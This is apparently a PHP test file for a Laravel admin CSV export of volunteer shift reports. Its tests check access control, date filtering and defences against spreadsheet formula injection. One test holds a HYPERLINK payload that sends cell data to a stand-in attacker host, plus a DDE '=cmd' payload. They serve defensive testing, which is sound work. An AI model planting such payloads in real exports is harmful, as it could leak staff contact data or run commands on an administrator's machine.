<?php

use App\Models\Location;
use App\Models\Report;
use App\Models\Shift;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\Traits\AssertsExportResponses;
use Tests\Traits\MakesTags;

uses(AssertsExportResponses::class);

uses(MakesTags::class);

uses(RefreshDatabase::class);

test('admin can download reports as csv', function () {
    $admin = User::factory()->enabled()->adminRoleUser()->create();
    $user = User::factory()->enabled()->create([
        'name' => 'Alice Volunteer',
        'email' => 'alice@example.com',
        'mobile_phone' => '0412345678',
    ]);
    $location = Location::factory()->create(['name' => 'Main Cart']);
    $shift = Shift::factory()->everyDay9am()->for($location)->create();

    $report = Report::factory()->create([
        'shift_id' => $shift->id,
        'report_submitted_user_id' => $user->id,
        'shift_date' => '2024-01-10',
        'placements_count' => 3,
        'videos_count' => 2,
        'requests_count' => 1,
        'comments' => 'Good shift',
        'shift_was_cancelled' => false,
        'metadata' => [
            'shift_id' => $shift->id,
            'shift_time' => '09:00:00',
            'location_id' => $location->id,
            'location_name' => 'Main Cart',
            'submitted_by_id' => $user->id,
            'submitted_by_name' => 'Alice Volunteer',
            'submitted_by_email' => 'alice@example.com',
            'submitted_by_phone' => '0412345678',
            'associates' => [
                ['id' => 99, 'name' => 'Bob Associate'],
            ],
        ],
    ]);

    $tags = $this->makeTags(2);
    $report->syncTags($tags);

    $rows = $this->assertExportCsvDownload(
        $this->actingAs($admin)
            ->get('/admin/exports/reports?start_date=2024-01-01&end_date=2024-01-31'),
        'reports',
    );

    expect($rows[0])->toBe([
        'id',
        'shift_date',
        'placements_count',
        'videos_count',
        'requests_count',
        'comments',
        'shift_was_cancelled',
        'tags',
        'metadata_shift_id',
        'metadata_shift_time',
        'metadata_location_id',
        'metadata_location_name',
        'metadata_submitted_by_id',
        'metadata_submitted_by_name',
        'metadata_submitted_by_email',
        'metadata_submitted_by_phone',
        'metadata_associates',
    ]);
    expect($rows[1][0])->toBe((string) $report->id);
    expect($rows[1][1])->toBe('2024-01-10');
    expect($rows[1][2])->toBe('3');
    expect($rows[1][5])->toBe('Good shift');
    expect($rows[1][6])->toBe('0');
    expect($rows[1][11])->toBe('Main Cart');
    expect($rows[1][16])->toBe('Bob Associate');
});

test('a comment that looks like a formula is exported as text', function () {
    $admin = User::factory()->enabled()->adminRoleUser()->create();
    $user = User::factory()->enabled()->create(['name' => '=cmd|\'/C calc\'!A0']);
    $location = Location::factory()->create();
    $shift = Shift::factory()->everyDay9am()->for($location)->create();

    // A volunteer writes this into their own shift report. It reaches an
    // admin's spreadsheet, alongside the roster's phone numbers and emails.
    $payload = '=HYPERLINK("https://attacker.example/?d="&A2,"Click")';

    Report::factory()->create([
        'shift_id' => $shift->id,
        'report_submitted_user_id' => $user->id,
        'shift_date' => '2024-01-10',
        'comments' => $payload,
        'metadata' => [
            'shift_id' => $shift->id,
            'shift_time' => '09:00:00',
            'location_id' => $location->id,
            'location_name' => $location->name,
            'submitted_by_id' => $user->id,
            'submitted_by_name' => $user->name,
            'submitted_by_email' => $user->email,
            'submitted_by_phone' => $user->mobile_phone,
            'associates' => [],
        ],
    ]);

    $rows = $this->assertExportCsvDownload(
        $this->actingAs($admin)
            ->get('/admin/exports/reports?start_date=2024-01-01&end_date=2024-01-31'),
        'reports',
    );

    // The apostrophe is what stops the spreadsheet evaluating the cell. The
    // text itself is kept intact so the admin still reads what was written.
    expect($rows[1][5])->toBe("'".$payload);
    expect($rows[1][13])->toStartWith("'=cmd");
});

/**
 * @return list<string>
 */
dataset('formulaLeadingCharacterProvider', function () {
    return [
        'equals' => ['='],
        'plus' => ['+'],
        'minus' => ['-'],
        'at' => ['@'],
        'tab' => ["\t"],
        'carriage return' => ["\r"],
    ];
});

test('every formula leading character is neutralised', function (string $character) {
    $admin = User::factory()->enabled()->adminRoleUser()->create();
    $user = User::factory()->enabled()->create();
    $shift = Shift::factory()->everyDay9am()->for(Location::factory())->create();

    Report::factory()->create([
        'shift_id' => $shift->id,
        'report_submitted_user_id' => $user->id,
        'shift_date' => '2024-01-10',
        'comments' => $character.'SUM(1+1)',
        'metadata' => null,
    ]);

    $rows = $this->assertExportCsvDownload(
        $this->actingAs($admin)
            ->get('/admin/exports/reports?start_date=2024-01-01&end_date=2024-01-31'),
        'reports',
    );

    expect($rows[1][5])->toBe("'".$character.'SUM(1+1)');
})->with('formulaLeadingCharacterProvider');

test('an ordinary comment is left alone', function () {
    $admin = User::factory()->enabled()->adminRoleUser()->create();
    $user = User::factory()->enabled()->create();
    $shift = Shift::factory()->everyDay9am()->for(Location::factory())->create();

    Report::factory()->create([
        'shift_id' => $shift->id,
        'report_submitted_user_id' => $user->id,
        'shift_date' => '2024-01-10',
        'comments' => 'Busy morning, 3 placements',
        'metadata' => null,
    ]);

    $rows = $this->assertExportCsvDownload(
        $this->actingAs($admin)
            ->get('/admin/exports/reports?start_date=2024-01-01&end_date=2024-01-31'),
        'reports',
    );

    // Escaping everything would put a stray apostrophe in front of every
    // cell an admin reads, so only the dangerous opening characters count.
    expect($rows[1][5])->toBe('Busy morning, 3 placements');
});

test('reports are limited to date range', function () {
    $admin = User::factory()->enabled()->adminRoleUser()->create();
    $user = User::factory()->enabled()->create();
    $location = Location::factory()->create();
    $shift = Shift::factory()->everyDay9am()->for($location)->create();

    Report::factory()->create([
        'shift_id' => $shift->id,
        'report_submitted_user_id' => $user->id,
        'shift_date' => '2024-01-10',
        'metadata' => null,
    ]);
    Report::factory()->create([
        'shift_id' => $shift->id,
        'report_submitted_user_id' => $user->id,
        'shift_date' => '2024-02-15',
        'metadata' => null,
    ]);

    $rows = $this->assertExportCsvDownload(
        $this->actingAs($admin)
            ->get('/admin/exports/reports?start_date=2024-01-01&end_date=2024-01-31'),
        'reports',
    );

    expect($rows)->toHaveCount(2);
    expect($rows[1][1])->toBe('2024-01-10');
});

test('non admin cannot download reports', function () {
    $user = User::factory()->enabled()->create();

    $this->actingAs($user)
        ->get('/admin/exports/reports?start_date=2024-01-01&end_date=2024-01-31')
        ->assertForbidden();
});

test('reports export requires date range', function () {
    $admin = User::factory()->enabled()->adminRoleUser()->create();

    $this->actingAs($admin)
        ->get('/admin/exports/reports')
        ->assertSessionHasErrors(['start_date', 'end_date']);
});

test('unauthenticated request is rejected', function () {
    $this->get('/admin/exports/reports?start_date=2024-01-01&end_date=2024-01-31')
        ->assertRedirect('/login');
});
